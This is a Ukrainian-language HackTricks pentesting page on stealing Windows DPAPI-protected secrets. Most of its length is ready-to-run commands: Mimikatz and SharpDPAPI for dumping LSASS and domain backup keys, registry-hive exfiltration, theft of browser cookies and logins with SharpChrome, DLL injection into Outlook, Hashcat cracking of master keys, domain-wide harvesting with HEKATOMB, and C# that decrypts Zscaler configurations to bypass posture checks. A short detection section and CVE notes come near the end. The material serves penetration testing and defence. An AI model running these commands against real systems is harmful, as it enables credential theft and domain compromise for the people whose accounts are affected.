# DPAPI - Витягування паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

Data Protection API (DPAPI) переважно використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи секрети користувача або системи як важливе джерело ентропії. Такий підхід спрощує шифрування для розробників, оскільки дає змогу шифрувати дані за допомогою ключа, похідного від секретів входу користувача або, у разі системного шифрування, секретів доменної автентифікації системи, усуваючи потребу самостійно керувати захистом ключа шифрування.

Найпоширеніший спосіб використання DPAPI — через функції **`CryptProtectData` і `CryptUnprotectData`**, які дають змогу застосункам шифрувати та розшифровувати дані, використовуючи контекст безпеки поточного процесу, у якому виконано вхід. За замовчуванням дані можуть бути розшифровані лише тим самим контекстом користувача або системи, який їх зашифрував.<sup>[[2]](#references)[[3]](#references)</sup>

Ці функції також приймають необов'язковий **параметр ентропії**, який використовується під час шифрування та розшифрування. Для розшифрування даних, захищених із використанням необов'язкової ентропії, потрібне те саме значення ентропії.<sup>[[2]](#references)[[6]](#references)</sup>

### Генерація ключа користувача

DPAPI виводить специфічне для користувача значення (яке часто називають **pre-key**) з облікових даних користувача. Точний спосіб виведення залежить від облікового запису та версії операційної системи. Наприклад, Impacket використовує шлях HMAC-SHA1 на основі дайджесту SHA-1 пароля у форматі UTF-16LE, інший шлях — на основі MD4/NT hash пароля, а також шлях на основі PBKDF2-SHA256 для Protected Users. Саме тому offline-інструменти часто можуть отримати необхідний матеріал як із пароля у відкритому вигляді, так і з доступного NT hash.<sup>[[2]](#references)[[10]](#references)</sup>

Це особливо цікаво, оскільки якщо атакувальник може отримати хеш пароля користувача, він може:

- **Розшифрувати будь-які дані, зашифровані за допомогою DPAPI**, використовуючи ключ цього користувача, без необхідності звертатися до будь-якого API
- Спробувати **зламати пароль** offline, генеруючи дійсний ключ DPAPI

DPAPI підтримує один або кілька **master keys** для кожного користувача, замість створення нового master key для кожного захищеного blob. Кожен master key має **GUID** (Globally Unique Identifier), а зашифрований blob містить інформацію про те, який master key його захищає.<sup>[[2]](#references)</sup>

Master keys зберігаються в каталозі **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` — це Security Identifier користувача. Файл master key містить матеріал, захищений **pre-key** користувача, а для доменних користувачів — матеріал відновлення, захищений **domain backup key**.<sup>[[2]](#references)</sup>

Зверніть увагу, що **domain key, який використовується для шифрування master key, зберігається на контролерах домену і ніколи не змінюється**, тому якщо атакувальник має доступ до контролера домену, він може отримати domain backup key і розшифрувати master keys усіх користувачів у домені.<sup>[[2]](#references)</sup>

Зашифровані blobs містять **GUID master key**, який використовувався для шифрування даних, у своїх заголовках.

> [!TIP]
> Зашифровані DPAPI blobs починаються з **`01 00 00 00`**

Знайти master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ось як виглядає набір Master Keys користувача:

![Що таке DPAPI — генерація ключів користувача: Ось як виглядає набір Master Keys користувача](<../../images/image (1121).png>)

### Генерація ключів Machine/System

Цей ключ використовується machine для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret** — спеціальному ключі, доступ до якого має лише користувач SYSTEM. Цей ключ використовується для шифрування даних, до яких має отримувати доступ сама система, наприклад облікових даних рівня machine або загальносистемних секретів.<sup>[[2]](#references)</sup>

Зверніть увагу, що ці ключі **не мають domain backup**, тому доступні лише локально:

- **Mimikatz** може отримати до них доступ, дампуючи LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається всередині registry, тому адміністратор може **змінити дозволи DACL, щоб отримати до нього доступ**. Шлях у registry: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Також можливе offline-вилучення з registry hives. Наприклад, маючи права адміністратора на target, збережіть hives і ексфільтруйте їх:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Потім на вашій analysis box відновіть секрет DPAPI_SYSTEM LSA з hive-файлів і використайте його для розшифрування blobs машинного рівня (паролі запланованих завдань, облікові дані служб, профілі Wi‑Fi тощо):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Специфічний для Veeam приклад DPAPI:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Дані, захищені DPAPI

До персональних даних, які захищає DPAPI, належать:

- облікові дані Windows
- паролі та дані автозаповнення Internet Explorer і Google Chrome
- паролі облікових записів електронної пошти та внутрішнього FTP для таких застосунків, як Outlook і Windows Mail
- паролі для спільних папок, ресурсів, бездротових мереж і Windows Vault, включно з ключами шифрування
- паролі для підключень до віддаленого робочого столу, .NET Passport і приватні ключі для різних цілей шифрування та автентифікації
- мережеві паролі, якими керує Credential Manager, і персональні дані в застосунках, що використовують CryptProtectData, таких як Skype, MSN messenger тощо
- зашифровані blobs усередині реєстру
- ...

Захищені системою дані включають:
- паролі Wifi
- паролі запланованих завдань
- ...

### Варіанти вилучення головного ключа

- Якщо користувач має привілеї domain admin, він може отримати доступ до **domain backup key**, щоб розшифрувати всі головні ключі користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи локальні привілеї адміністратора, можна **отримати доступ до пам’яті LSASS**, щоб вилучити головні ключі DPAPI усіх підключених користувачів і ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, він може отримати доступ до **DPAPI_SYSTEM LSA secret**, щоб розшифрувати майстер-ключі комп'ютера:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо відомий пароль або NTLM hash користувача, ви можете **безпосередньо розшифрувати головні ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте всередині сесії як цей користувач, можна попросити DC надати **резервний ключ для розшифрування master keys за допомогою RPC**. Якщо ви маєте права локального адміністратора, а користувач увійшов у систему, для цього можна **викрасти його session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Пошук зашифрованих даних DPAPI

**Захищені файли** звичайних користувачів знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Також перевірте заміну `\Roaming\` на `\Local\` у наведених вище шляхах.

Приклади переліку:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити зашифровані DPAPI blobs у файловій системі, реєстрі та B64 blobs:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того самого репозиторію) можна використовувати для розшифрування за допомогою DPAPI таких конфіденційних даних, як cookies.<sup>[[12]](#references)</sup>

#### Швидкі рецепти для Chromium/Edge/Electron (SharpChrome)

- Поточний користувач, інтерактивне розшифрування збережених логінів/cookies (працює навіть із app-bound cookies у Chrome 127+, оскільки додатковий ключ отримується з Credential Manager користувача під час роботи в контексті користувача):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-аналіз, коли у вас є лише файли. Спочатку витягніть AES state key із файлу профілю "Local State", а потім використайте його для розшифрування cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Загальнодоменний/віддалений triage, коли у вас є резервний ключ домену DPAPI (PVK) і admin на цільовому хості:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Якщо у вас є DPAPI prekey/credkey користувача (отриманий із LSASS), можна пропустити password cracking і безпосередньо розшифрувати дані профілю:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Примітки
- Новіші версії Chrome/Edge можуть зберігати певні cookies із використанням шифрування "App-Bound". Offline розшифрування таких cookies неможливе без додаткового app-bound key; запустіть SharpChrome у контексті цільового користувача, щоб автоматично отримати його. Див. публікацію в блозі про безпеку Chrome, на яку наведено посилання нижче.<sup>[[5]](#references)</sup>

### Ключі доступу та дані

- **Використовуйте SharpDPAPI**, щоб отримати облікові дані з DPAPI-зашифрованих файлів поточного сеансу:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримайте інформацію про облікові дані** на кшталт зашифрованих даних і guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Отримання доступу до masterkeys**:

Розшифрувати masterkey користувача, запитавши **domain backup key** через RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування masterkey (зверніть увагу, що можна використовувати `/rpc`, щоб отримати резервний ключ домену, `/password`, щоб використати пароль у відкритому вигляді, або `/pvk`, щоб вказати файл із приватним ключем домену DPAPI...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрування даних за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує такі аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що `/rpc` можна використати для отримання резервного ключа домену, `/password` — для використання пароля у відкритому вигляді, `/pvk` — для вказання файлу приватного ключа DPAPI домену, `/unprotect` — для використання сеансу поточного користувача...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Використання DPAPI prekey/credkey безпосередньо (пароль не потрібен)

Якщо ви можете виконати dump LSASS, Mimikatz часто витягує DPAPI key для кожного сеансу входу, який можна використати для розшифрування masterkeys користувача без знання пароля у відкритому вигляді. Передайте це значення безпосередньо інструменту:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Розшифрувати деякі дані за допомогою **поточного сеансу користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Офлайн-розшифрування за допомогою Impacket dpapi.py

Якщо у вас є SID і пароль користувача-жертви (або NT hash), ви можете повністю офлайн розшифрувати masterkeys DPAPI та blobs Credential Manager за допомогою Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Ідентифікуйте артефакти на диску:
- Blob(s) Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
- Відповідний masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Якщо інструменти передавання файлів працюють нестабільно, закодуйте файли у base64 на хості та скопіюйте результат:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Розшифруйте masterkey за допомогою SID і пароля/хешу користувача:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Використайте розшифрований masterkey, щоб розшифрувати blob облікових даних:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Цей workflow часто відновлює доменні облікові дані, збережені застосунками через Windows Credential Manager, зокрема адміністративні облікові записи (наприклад, `*_adm`).

---

### Обробка додаткової entropy («Third-party entropy»)

Деякі застосунки передають додаткове значення **entropy** до `CryptProtectData`. Без цього значення blob неможливо розшифрувати, навіть якщо відомий правильний masterkey. Тому отримання entropy є необхідним під час атак на облікові дані, захищені таким способом (наприклад, Microsoft Outlook і деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це DLL у user-mode, яка перехоплює функції DPAPI всередині цільового процесу та прозоро записує будь-яку передану optional entropy. Запуск EntropyCapture у режимі **DLL-injection** проти таких процесів, як `outlook.exe` або `vpnclient.exe`, створює файл, що зіставляє кожен entropy buffer із процесом-викликачем і blob. Згодом перехоплену entropy можна передати до **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`), щоб розшифрувати дані.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys офлайн (Hashcat & DPAPISnoop)

Microsoft представила формат **context 3** для masterkey, починаючи з Windows 10 v1607 (2016). `hashcat` v6.2.6 (грудень 2023 року) додав hash-моди **22100** (DPAPI masterkey v1 context ), **22101** (context 1) і **22102** (context 3), що дають змогу виконувати GPU-прискорений cracking паролів користувачів безпосередньо з файлу masterkey. Отже, attackers можуть виконувати word-list або brute-force атаки без взаємодії з цільовою системою.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) автоматизує цей процес:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може аналізувати Credential і Vault blobs, розшифровувати їх за допомогою cracked keys і експортувати паролі у відкритому вигляді.<sup>[[8]](#references)</sup>


### Доступ до даних іншої машини

У **SharpDPAPI і SharpChrome** можна вказати опцію **`/server:HOST`**, щоб отримати доступ до даних віддаленої машини. Звичайно, необхідно мати можливість отримати доступ до цієї машини, а в наведеному нижче прикладі передбачається, що **ключ шифрування резервної копії домену відомий**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — це інструмент, який автоматизує отримання всіх користувачів і комп’ютерів із LDAP-директорії, а також отримання резервного ключа доменного контролера через RPC. Потім скрипт визначає IP-адреси всіх комп’ютерів і виконує smbclient на кожному з них, щоб отримати всі DPAPI blobs усіх користувачів і розшифрувати все за допомогою резервного ключа домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

За допомогою списку комп’ютерів, отриманого з LDAP, можна знайти кожну підмережу, навіть якщо ви не знали про її існування!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично отримувати secrets, захищені DPAPI. У релізі 2.x представлено:<sup>[[9]](#references)</sup>

* Паралельний збір blobs із сотень хостів
* Обробка masterkeys **context 3** та автоматична інтеграція з cracking у Hashcat
* Підтримка зашифрованих cookies Chrome з **"App-Bound"** (див. наступний розділ)
* Новий режим **`--snapshot`** для регулярного опитування endpoints і порівняння новостворених blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — це C# parser для файлів masterkey/credential/vault, який може виводити формати Hashcat/JtR і за потреби автоматично запускати cracking. Він повністю підтримує формати машинних і користувацьких masterkey до Windows 11 24H1.<sup>[[8]](#references)</sup>


## Поширені способи виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших директоріях, пов’язаних із DPAPI.
- Особливо через мережеву шару, як-от **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам’яті LSASS чи отримання masterkeys.
- Подія **4662**: *An operation was performed on an object* — може бути зіставлена з доступом до об’єкта **`BCKUPKEY`**.
- Події **4673/4674**, коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Вразливості 2023–2025 років і зміни в екосистемі

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023 року). Зловмисник із мережевим доступом міг змусити учасника домену отримати шкідливий резервний ключ DPAPI, що дозволяло розшифрувати masterkeys користувачів. Вразливість виправлено в сукупному оновленні за листопад 2023 року — адміністратори повинні переконатися, що DC і робочі станції повністю оновлені.<sup>[[4]](#references)</sup>
* **Шифрування cookies Chrome 127 “App-Bound”** (липень 2024 року) замінило застарілий захист, що покладався лише на DPAPI, додатковим ключем, який зберігається в **Credential Manager** користувача. Для offline-розшифрування cookies тепер потрібні і masterkey DPAPI, і **GCM-wrapped app-bound key**. SharpChrome v2.3 і DonPAPI 2.x можуть отримати додатковий ключ під час роботи в контексті користувача.<sup>[[5]](#references)</sup>


### Практичний приклад: Zscaler Client Connector — custom entropy, отримана з SID

Zscaler Client Connector зберігає кілька конфігураційних файлів у `C:\ProgramData\Zscaler` (наприклад, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожен файл зашифровано за допомогою **DPAPI (Machine scope)**, але постачальник використовує **custom entropy**, яка *обчислюється під час виконання*, а не зберігається на диску.<sup>[[1]](#references)</sup>

Entropy відновлюється з двох елементів:

1. Жорстко закодованого secret, вбудованого в `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований DLL, еквівалентний:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудовано в DLL, яку можна прочитати з диска, **будь-який локальний зловмисник із правами SYSTEM може повторно згенерувати ентропію для будь-якого SID** і розшифрувати blob-файли офлайн:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування повертає повну JSON-конфігурацію, включно з кожною **device posture check** та її очікуваним значенням — ця інформація дуже цінна під час спроб виконати client-side bypasses.

> ПОРАДА: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені за допомогою DPAPI **без entropy** (`16` нульових байтів). Тому їх можна безпосередньо розшифрувати за допомогою `ProtectedData.Unprotect` після отримання привілеїв SYSTEM.

## References

- [1] [Synacktiv – Чи варто довіряти вашому zero trust? Обхід posture checks у Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Секрети DPAPI. Аналіз безпеки та відновлення даних у DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Читання зашифрованих секретів DPAPI за допомогою Mimikatz і C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 — вразливість Windows DPAPI (Data Protection Application Programming Interface) типу Spoofing](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Покращення безпеки cookie Chrome у Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: просте вилучення додаткової entropy DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Примітки до випуску hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop — репозиторій GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 — сторінка проєкту PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket — dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: зловживання AD ACL, cracking Argon2 у KeePassXC і розшифрування DPAPI для отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome — використання та параметри](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
